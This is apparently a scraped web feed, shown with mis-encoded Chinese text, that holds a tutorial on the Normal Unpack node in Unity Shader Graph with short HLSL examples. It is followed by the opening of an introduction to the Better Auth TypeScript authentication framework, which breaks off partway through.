#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">ã€Unity Shader Graph ä½¿ç”¨ä¸ç‰¹æ•ˆå®ç°ã€‘</a><strong>ä¸“æ -ç›´è¾¾</strong></p>
</blockquote>
<h2 data-id="heading-0">æ ¸å¿ƒåŠŸèƒ½æ¦‚è¿°</h2>
<p>æ³•çº¿è§£åŒ…èŠ‚ç‚¹ï¼ˆNormal Unpack Nodeï¼‰æ˜¯Unity URPæ¸²æŸ“ç®¡çº¿ä¸­å¤„ç†æ³•çº¿è´´å›¾æ•°æ®çš„æ ¸å¿ƒç»„ä»¶ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯<strong>å¯¹å‹ç¼©å­˜å‚¨çš„æ³•çº¿å‘é‡</strong>è¿›è¡Œè§£å‹ç¼©è½¬æ¢ã€‚è¯¥èŠ‚ç‚¹é€šè¿‡ç‰¹å®šç®—æ³•å°†çº¹ç†é‡‡æ ·ç»“æœä¸­çš„å‹ç¼©æ³•çº¿æ•°æ®è¿˜åŸä¸ºç¬¦åˆæ¸²æŸ“ç®¡çº¿è¦æ±‚çš„3Då‘é‡ï¼Œæœ‰æ•ˆè§£å†³ç›´æ¥é‡‡æ ·æ³•çº¿è´´å›¾æ—¶å¯èƒ½å‡ºç°çš„æ ¼å¼å…¼å®¹æ€§é—®é¢˜ã€‚</p>
<h3 data-id="heading-1">æŠ€æœ¯ä»·å€¼</h3>
<ul>
<li><strong>æ ¼å¼å…¼å®¹æ€§</strong>ï¼šè‡ªåŠ¨å¤„ç†RGï¼ˆçº¢ç»¿é€šé“ï¼‰æˆ–RGBï¼ˆå…¨é€šé“ï¼‰å­˜å‚¨çš„æ³•çº¿è´´å›¾æ ¼å¼</li>
<li><strong>ç©ºé—´è½¬æ¢</strong>ï¼šæ”¯æŒåˆ‡çº¿ç©ºé—´ï¼ˆTangent Spaceï¼‰å’Œå¯¹è±¡ç©ºé—´ï¼ˆObject Spaceï¼‰ä¸¤ç§è¾“å‡ºæ¨¡å¼</li>
<li><strong>é”™è¯¯è¡¥æ•‘</strong>ï¼šåœ¨æ³•çº¿è´´å›¾ç±»å‹è®¾ç½®é”™è¯¯æ—¶æä¾›æ•°æ®æ¢å¤æ–¹æ¡ˆ</li>
</ul>
<h2 data-id="heading-2">ç«¯å£ä¸å‚æ•°è¯¦è§£</h2>
<p><img src="https://docs.unity.cn/cn/Packages-cn/com.unity.shadergraph@14.0/manual/images/NormalUnpackNodeThumb.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">ç«¯å£é…ç½®</h3>
<p>æ³•çº¿è§£åŒ…èŠ‚ç‚¹åŒ…å«ä¸¤ä¸ªæ ¸å¿ƒç«¯å£ï¼š</p>
<ul>
<li><strong>è¾“å…¥ç«¯å£ï¼ˆInï¼‰</strong>ï¼šæ¥æ”¶é‡‡æ ·åçš„çº¹ç†æ•°æ®ï¼ˆVector4ç±»å‹ï¼‰ï¼ŒåŒ…å«RGBAå››ä¸ªé€šé“å€¼</li>
<li><strong>è¾“å‡ºç«¯å£ï¼ˆOutï¼‰</strong>ï¼šè¾“å‡ºè½¬æ¢åçš„æ³•çº¿å‘é‡ï¼ˆVector3ç±»å‹ï¼‰ï¼ŒåŒ…å«XYZä¸‰ä¸ªåˆ†é‡</li>
</ul>
<h3 data-id="heading-4">æ§åˆ¶å‚æ•°</h3>
<p>è¯¥èŠ‚ç‚¹æä¾›ä¸¤ä¸ªå…³é”®æ§åˆ¶å‚æ•°ï¼š</p>
<ul>
<li><strong>Spaceï¼ˆç©ºé—´æ¨¡å¼ï¼‰</strong>ï¼šå†³å®šè¾“å‡ºæ³•çº¿çš„åæ ‡ç©ºé—´
<ul>
<li><strong>Tangentï¼ˆåˆ‡çº¿ç©ºé—´ï¼‰</strong>ï¼šé€‚ç”¨äºæ ‡å‡†æ³•çº¿è´´å›¾ï¼Œä½¿ç”¨UnpackNormalmapRGorAGå‡½æ•°å¤„ç†RGé€šé“æ•°æ®</li>
<li><strong>Objectï¼ˆå¯¹è±¡ç©ºé—´ï¼‰</strong>ï¼šé€‚ç”¨äºå¯¹è±¡ç©ºé—´æ³•çº¿è´´å›¾ï¼Œä½¿ç”¨UnpackNormalmapRGBå‡½æ•°å¤„ç†RGBé€šé“æ•°æ®</li>
</ul>
</li>
</ul>
<h2 data-id="heading-5">æŠ€æœ¯å®ç°åŸç†</h2>
<h3 data-id="heading-6">æ³•çº¿æ•°æ®å­˜å‚¨æœºåˆ¶</h3>
<p>æ³•çº¿è´´å›¾é€šå¸¸é‡‡ç”¨å‹ç¼©å­˜å‚¨æ–¹å¼ä»¥èŠ‚çœçº¹ç†å†…å­˜ï¼š</p>
<ul>
<li><strong>RGå­˜å‚¨</strong>ï¼šä»…ä½¿ç”¨çº¢è‰²å’Œç»¿è‰²é€šé“å­˜å‚¨æ³•çº¿çš„XYåˆ†é‡ï¼ŒZåˆ†é‡é€šè¿‡å…¬å¼è®¡ç®—å¾—å‡º</li>
<li><strong>RGBå­˜å‚¨</strong>ï¼šä½¿ç”¨å…¨é€šé“å­˜å‚¨æ³•çº¿å‘é‡ï¼Œé€‚ç”¨äºå¯¹è±¡ç©ºé—´æ³•çº¿è´´å›¾</li>
</ul>
<h3 data-id="heading-7">ç©ºé—´è½¬æ¢é€»è¾‘</h3>
<p>èŠ‚ç‚¹æ ¹æ®Spaceå‚æ•°æ‰§è¡Œä¸åŒçš„ç©ºé—´è½¬æ¢ï¼š</p>
<ul>
<li><strong>åˆ‡çº¿ç©ºé—´æ¨¡å¼</strong>ï¼šå°†å‹ç¼©çš„RGæ•°æ®è½¬æ¢ä¸ºåˆ‡çº¿ç©ºé—´ä¸‹çš„æ³•çº¿å‘é‡ï¼Œå…¶Zåˆ†é‡é€šè¿‡å…¬å¼è®¡ç®—ï¼š<code>Z = sqrt(1 - XÂ² - YÂ²)</code></li>
<li><strong>å¯¹è±¡ç©ºé—´æ¨¡å¼</strong>ï¼šç›´æ¥å¤„ç†RGBé€šé“æ•°æ®ï¼Œé€šè¿‡UnpackNormalmapRGBå‡½æ•°å°†å‹ç¼©çš„RGBå€¼è½¬æ¢ä¸ºå¯¹è±¡ç©ºé—´æ³•çº¿å‘é‡</li>
</ul>
<h2 data-id="heading-8">å…¸å‹åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-9">æ³•çº¿è´´å›¾ç±»å‹é”™è¯¯è¡¥æ•‘</h3>
<p>å½“è¯¯å°†æ³•çº¿è´´å›¾è®¾ä¸ºDefaultç±»å‹æ—¶ï¼Œè¯¥èŠ‚ç‚¹å¯é€šè¿‡æ‰‹åŠ¨è§£å‹æ¢å¤æ³•çº¿æ•°æ®ï¼š</p>
<ol>
<li>ä½¿ç”¨Sample Texture 2DèŠ‚ç‚¹é‡‡æ ·æ³•çº¿è´´å›¾</li>
<li>å°†é‡‡æ ·ç»“æœè¿æ¥è‡³Normal UnpackèŠ‚ç‚¹çš„è¾“å…¥ç«¯å£</li>
<li>æ ¹æ®è´´å›¾ç±»å‹é€‰æ‹©Tangentæˆ–Objectç©ºé—´æ¨¡å¼</li>
</ol>
<h3 data-id="heading-10">å¤šé€šé“çº¹ç†å¤ç”¨</h3>
<p>åœ¨éœ€è¦åŒæ—¶ä½¿ç”¨æ³•çº¿è´´å›¾å’Œå…¶ä»–çº¹ç†çš„åœºæ™¯ä¸­ï¼š</p>
<ul>
<li>é€šè¿‡Channel SplitèŠ‚ç‚¹åˆ†ç¦»æ³•çº¿è´´å›¾çš„RGé€šé“</li>
<li>å°†åˆ†ç¦»åçš„é€šé“è¿æ¥è‡³Normal UnpackèŠ‚ç‚¹</li>
<li>ä¸ä¸»çº¹ç†è¿›è¡Œæ··åˆå¤„ç†</li>
</ul>
<h3 data-id="heading-11">è·¨å¹³å°å…¼å®¹å¤„ç†</h3>
<p>é’ˆå¯¹ä¸åŒå¹³å°çš„æ³•çº¿è´´å›¾å·®å¼‚ï¼š</p>
<ul>
<li>å¯¹ç§»åŠ¨ç«¯å¹³å°ä½¿ç”¨RGå­˜å‚¨æ¨¡å¼</li>
<li>å¯¹PCç«¯å¹³å°ä½¿ç”¨RGBå­˜å‚¨æ¨¡å¼</li>
<li>é€šè¿‡æ¡ä»¶åˆ¤æ–­èŠ‚ç‚¹é€‰æ‹©å¯¹åº”çš„è§£å‹æ–¹å¼</li>
</ul>
<h2 data-id="heading-12">æœ€ä½³å®è·µå»ºè®®</h2>
<ol>
<li><strong>ä¼˜å…ˆä½¿ç”¨å†…ç½®é‡‡æ ·</strong>ï¼šåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç›´æ¥ä½¿ç”¨Sample Texture 2DèŠ‚ç‚¹å¹¶è®¾ç½®Typeä¸ºNormalæ›´ä¸ºé«˜æ•ˆ</li>
<li><strong>ç©ºé—´æ¨¡å¼é€‰æ‹©</strong>ï¼šåˆ‡çº¿ç©ºé—´æ¨¡å¼é€‚ç”¨äºæ ‡å‡†æ³•çº¿è´´å›¾ï¼Œå¯¹è±¡ç©ºé—´æ¨¡å¼é€‚ç”¨äºé¢„è®¡ç®—çš„å¯¹è±¡ç©ºé—´æ³•çº¿</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šé¿å…åœ¨ç‰‡æ®µç€è‰²å™¨ä¸­å¤šæ¬¡ä½¿ç”¨è¯¥èŠ‚ç‚¹ï¼Œå¯è€ƒè™‘åœ¨é¡¶ç‚¹ç€è‰²å™¨ä¸­é¢„è®¡ç®—éƒ¨åˆ†ç»“æœ</li>
<li><strong>è°ƒè¯•æŠ€å·§</strong>ï¼šé€šè¿‡å°†è¾“å‡ºæ³•çº¿è¿æ¥è‡³ColorèŠ‚ç‚¹ï¼Œå¯è§†åŒ–æ³•çº¿æ–¹å‘ä»¥éªŒè¯è§£å‹æ•ˆæœ</li>
</ol>
<h2 data-id="heading-13">ä»£ç ç”Ÿæˆç¤ºä¾‹</h2>
<h3 data-id="heading-14">åˆ‡çº¿ç©ºé—´æ¨¡å¼</h3>
<p><code>void Unity_NormalUnpack_float(float4 In, out float3 Out) {     Out = UnpackNormalmapRGorAG(In); }</code></p>
<p>è¯¥å‡½æ•°å°†RGé€šé“æ•°æ®è½¬æ¢ä¸ºåˆ‡çº¿ç©ºé—´æ³•çº¿å‘é‡ï¼ŒZåˆ†é‡é€šè¿‡è®¡ç®—å¾—å‡ºã€‚</p>
<h3 data-id="heading-15">å¯¹è±¡ç©ºé—´æ¨¡å¼</h3>
<p><code>void Unity_NormalUnpackRGB_float(float4 In, out float3 Out) {     Out = UnpackNormalmapRGB(In); }</code></p>
<p>è¯¥å‡½æ•°ç›´æ¥å¤„ç†RGBé€šé“æ•°æ®ï¼Œå°†å…¶è½¬æ¢ä¸ºå¯¹è±¡ç©ºé—´æ³•çº¿å‘é‡ã€‚</p>
<h2 data-id="heading-16">å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-17">æ³•çº¿è´´å›¾æ˜¾ç¤ºå¼‚å¸¸</h3>
<ul>
<li><strong>æ£€æŸ¥è´´å›¾ç±»å‹</strong>ï¼šç¡®ä¿çº¹ç†å¯¼å…¥è®¾ç½®ä¸­æ­£ç¡®æ ‡è®°ä¸ºNormal Map</li>
<li><strong>éªŒè¯ç©ºé—´æ¨¡å¼</strong>ï¼šæ ¹æ®è´´å›¾ç±»å‹é€‰æ‹©æ­£ç¡®çš„Spaceå‚æ•°</li>
<li><strong>æ£€æŸ¥é€šé“é¡ºåº</strong>ï¼šç¡®è®¤è´´å›¾çš„RGBé€šé“é¡ºåºä¸é¢„æœŸä¸€è‡´</li>
</ul>
<h3 data-id="heading-18">æ€§èƒ½é—®é¢˜</h3>
<ul>
<li><strong>å‡å°‘èŠ‚ç‚¹ä½¿ç”¨</strong>ï¼šåœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨å†…ç½®é‡‡æ ·ä»£æ›¿æ‰‹åŠ¨è§£å‹</li>
<li><strong>ä¼˜åŒ–è®¡ç®—</strong>ï¼šé¿å…åœ¨ç‰‡æ®µç€è‰²å™¨ä¸­é‡å¤è®¡ç®—ç›¸åŒæ•°æ®</li>
<li><strong>ä½¿ç”¨LOD</strong>ï¼šå¯¹è¿œè·ç¦»ç‰©ä½“ä½¿ç”¨ç®€åŒ–æ³•çº¿è´´å›¾</li>
</ul>
<h2 data-id="heading-19">é«˜çº§åº”ç”¨æŠ€å·§</h2>
<h3 data-id="heading-20">è‡ªå®šä¹‰çº¹ç†é‡‡æ ·æµç¨‹</h3>
<p>é€šè¿‡ç»„åˆä½¿ç”¨Normal UnpackèŠ‚ç‚¹å’Œå…¶ä»–èŠ‚ç‚¹ï¼Œå¯ä»¥å®ç°æ›´å¤æ‚çš„æ³•çº¿å¤„ç†ï¼š</p>
<ol>
<li>ä½¿ç”¨Sample Texture 2DèŠ‚ç‚¹é‡‡æ ·æ³•çº¿è´´å›¾</li>
<li>é€šè¿‡Normal UnpackèŠ‚ç‚¹è§£å‹æ³•çº¿å‘é‡</li>
<li>ä½¿ç”¨Normal BlendèŠ‚ç‚¹æ··åˆå¤šä¸ªæ³•çº¿è´´å›¾</li>
<li>æœ€ç»ˆå°†å¤„ç†åçš„æ³•çº¿åº”ç”¨äºå…‰ç…§è®¡ç®—</li>
</ol>
<h3 data-id="heading-21">åŠ¨æ€æ³•çº¿ç”Ÿæˆ</h3>
<p>ç»“åˆHeight Mapå’ŒNormal From HeightèŠ‚ç‚¹ï¼Œå¯ä»¥å®æ—¶ç”Ÿæˆæ³•çº¿è´´å›¾ï¼š</p>
<ol>
<li>ä½¿ç”¨Sample Texture 2DèŠ‚ç‚¹é‡‡æ ·é«˜åº¦å›¾</li>
<li>é€šè¿‡Normal From HeightèŠ‚ç‚¹ç”Ÿæˆæ³•çº¿è´´å›¾</li>
<li>ä½¿ç”¨Normal UnpackèŠ‚ç‚¹å¤„ç†ç”Ÿæˆçš„æ³•çº¿</li>
<li>å°†ç»“æœåº”ç”¨äºè¡¨é¢å…‰ç…§è®¡ç®—</li>
</ol>
<hr/>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">ã€Unity Shader Graph ä½¿ç”¨ä¸ç‰¹æ•ˆå®ç°ã€‘</a><strong>ä¸“æ -ç›´è¾¾</strong>
ï¼ˆæ¬¢è¿<em>ç‚¹èµç•™è¨€</em>æ¢è®¨ï¼Œæ›´å¤šäººåŠ å…¥è¿›æ¥èƒ½æ›´åŠ å®Œå–„è¿™ä¸ªæ¢ç´¢çš„è¿‡ç¨‹ï¼ŒğŸ™ï¼‰</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025å¹´å…¨çƒæœ€å—æ¬¢è¿çš„JSé‰´æƒæ¡†æ¶Better Authï¼Œ3åˆ†é’Ÿå¸¦ä½ å­¦ä¼š]]></title>    <link>https://juejin.cn/post/7592432859863007266</link>    <guid>https://juejin.cn/post/7592432859863007266</guid>    <pubDate>2026-01-07T14:35:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592432859863007266" data-draft-id="7592276645362139136" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025å¹´å…¨çƒæœ€å—æ¬¢è¿çš„JSé‰´æƒæ¡†æ¶Better Authï¼Œ3åˆ†é’Ÿå¸¦ä½ å­¦ä¼š"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-07T14:35:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ©™å­çš„AIç¬”è®°"/> <meta itemprop="url" content="https://juejin.cn/user/4010667128656254"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025å¹´å…¨çƒæœ€å—æ¬¢è¿çš„JSé‰´æƒæ¡†æ¶Better Authï¼Œ3åˆ†é’Ÿå¸¦ä½ å­¦ä¼š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4010667128656254/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ©™å­çš„AIç¬”è®°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:35:21.000Z" title="Wed Jan 07 2026 14:35:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4213d9e24124b0294748b42336f0451~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5a2Q55qEQUnnrJTorrA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768403709&amp;x-signature=FhoN8F%2FKhw0na8D74mfDHcr5vD4%3D" alt="2025JSæ¦œå•.png" loading="lazy"/></p>
<p>2025å¹´ JavaScript 10å¤§æœ€å—æ¬¢è¿çš„å‰ç«¯é¡¹ç›®å·²ç»å…¬å¸ƒï¼Œ<strong>Better Auth</strong>ä½œä¸ºé‡Œé¢å”¯ä¸€çš„é‰´æƒæ¡†æ¶ï¼Œå—åˆ°äº†ç‰¹åˆ«æ¨èï¼Œå¦‚æœä½ è¿˜å¯¹å®ƒä¸å¤ªäº†è§£ï¼Œè¯·èŠ±3åˆ†é’Ÿæ—¶é—´ï¼Œæˆ‘å°†å¸¦ä½ å¿«é€Ÿä¸Šæ‰‹ã€‚</p>
<hr/>
<h2 data-id="heading-0">Better Auth æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>Better Auth æ˜¯ä¸€ä¸ªæ¡†æ¶æ— å…³çš„ã€é€šç”¨çš„èº«ä»½éªŒè¯å’Œæˆæƒæ¡†æ¶ï¼Œä¸“ä¸º TypeScript è®¾è®¡ã€‚å®ƒæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯<strong>åŠŸèƒ½å…¨é¢ï¼Œå¼€ç®±å³ç”¨</strong>ã€‚</p>
<h3 data-id="heading-1">æ ¸å¿ƒèƒ½åŠ›ä¸€è§ˆ</h3>













































<table><thead><tr><th>åŠŸèƒ½ç±»åˆ«</th><th>å…·ä½“èƒ½åŠ›</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>åŸºç¡€è®¤è¯</td><td>é‚®ç®±å¯†ç ç™»å½•</td><td>å†…ç½®å®‰å…¨çš„å¯†ç å“ˆå¸Œå’ŒéªŒè¯</td></tr><tr><td>ç¤¾äº¤ç™»å½•</td><td>OAuth æ”¯æŒ</td><td>GitHubã€Googleã€Discordã€Twitter ç­‰ä¸»æµå¹³å°</td></tr><tr><td>å®‰å…¨å¢å¼º</td><td>2FA åŒå› ç´ è®¤è¯</td><td>ä¸ºè´¦æˆ·æä¾›é¢å¤–å®‰å…¨å±‚ï¼ˆé‚®ç®±ã€æ‰‹æœºéªŒè¯ç ç­‰ï¼‰</td></tr><tr><td>ä¼šè¯ç®¡ç†</td><td>å¤šä¼šè¯æ”¯æŒ</td><td>æ”¯æŒç”¨æˆ·åŒæ—¶ç™»å½•å¤šä¸ªè®¾å¤‡</td></tr><tr><td>ä¼ä¸šåŠŸèƒ½</td><td>SaaS å¤šç§Ÿæˆ·æ”¯æŒ</td><td>ç»„ç»‡ã€å›¢é˜Ÿã€æˆå‘˜å’Œé‚€è¯·ç®¡ç†</td></tr><tr><td>é«˜çº§åŠŸèƒ½</td><td>SSO å•ç‚¹ç™»å½•</td><td>åˆ›å»ºè‡ªå·±çš„èº«ä»½æä¾›å•†</td></tr><tr><td>æ‰©å±•æ€§</td><td>æ’ä»¶ç”Ÿæ€</td><td>é€šè¿‡æ’ä»¶æ‰©å±•åŠŸèƒ½</td></tr></tbody></table>
<p>è¿™äº›åŠŸèƒ½ï¼ŒBetter Auth éƒ½å°è£…å¥½äº†ï¼Œåªéœ€è¦é…ç½®ä¸€ä¸‹å°±èƒ½ç”¨ã€‚</p>
<p>ç›¸æ¯”ä¼ ç»Ÿçš„è®¤è¯æ–¹æ¡ˆï¼ˆæ¯”å¦‚ NextAuth.jsï¼‰ï¼ŒBetter Auth æœ‰å‡ ä¸ªæ˜æ˜¾çš„ä¼˜åŠ¿ï¼š</p>
<ol start="0">
<li><strong>æ¡†æ¶æ— å…³</strong>ï¼šä¸ç»‘å®šç‰¹å®šæ¡†æ¶ï¼ŒReactã€Vueã€Svelteã€Next.jsã€Nuxt éƒ½èƒ½ç”¨</li>
<li><strong>TypeScript åŸç”Ÿ</strong>ï¼šå®Œæ•´çš„ç±»å‹æ”¯æŒï¼Œå¼€å‘ä½“éªŒæ›´å¥½</li>
